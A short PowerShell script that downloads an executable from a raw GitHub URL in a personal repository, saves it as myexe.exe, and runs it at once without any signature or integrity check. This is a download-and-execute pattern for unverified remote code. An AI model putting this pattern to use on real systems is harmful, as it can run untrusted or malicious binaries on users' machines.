$url = "https://github.com/w00tles/work/raw/main/npp.exe"
$outpath = "$PSScriptRoot/myexe.exe"
Invoke-WebRequest -Uri $url -OutFile $outpath
Start-Process $outpath